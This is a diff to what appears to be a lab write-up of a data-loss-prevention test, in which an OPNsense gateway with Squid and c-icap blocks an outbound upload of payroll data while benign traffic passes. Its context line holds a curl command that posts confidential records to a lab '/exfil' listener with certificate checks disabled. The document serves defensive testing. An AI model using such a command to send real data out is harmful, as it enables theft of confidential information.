@@ -192,7 +192,7 @@ curl.exe -k -i -X POST https://10.0.2.25/exfil -d "CONFIDENTIAL_PAYROLL: Employe
 # 1. Benign HTTPS Transaction
 HTTP/1.1 200 OK
 Server: BaseHTTP/0.6 Python/3.13.5
-Date: Wed, 07 Oct 2026 20:28:40 GMT
+Date: Wed, 07 Oct 2026 22:11:46 GMT
 Content-Type: text/plain
 Content-Length: 22
 Cache-Status: OPNsense.internal;detail=mismatch
@@ -212,8 +212,9 @@ X-Squid-Error: ERR_SEC_ACCESS_DENIED 0
 * **Target Listener Console (Debian VM):**
 ```text
 # Received Benign POST (26 bytes forwarded through Squid):
-[2026-10-07 14:28:40] [EXFIL POST] 26 bytes received:
+[2026-10-07 16:11:46] [EXFIL POST] 26 bytes received:
 agent_id=102&status=online
+[HTTP] "POST /exfil HTTP/1.1" 200 -
 
 # Sensitive Exfiltration POST:
 # [BLOCKED AT GATEWAY] 0 bytes received; session aborted upstream by Squid
@@ -221,9 +222,9 @@ agent_id=102&status=online
 ```
 
 
-* **Firewall Log (`/var/log/c-icap/virus.log`):**
+* **Firewall Log (`/var/log/cicap/latest.log`):**
 ```text
-Wed Oct 07 13:00:14 2026, reqmod, virus: DLP.Outbound.RestrictedPII, client: 192.168.10.50
+<26>1 2026-10-07T22:20:50+00:00 OPNsense.internal c-icap 30963 - [meta sequenceId="1354"] 30963/27085909733392, VIRUS DETECTED: DLP.Outbound.RestrictedPII.UNOFFICIAL , http client ip: 192.168.10.50, http user: -, http url: https://10.0.2.25/exfil
 
 ```
 
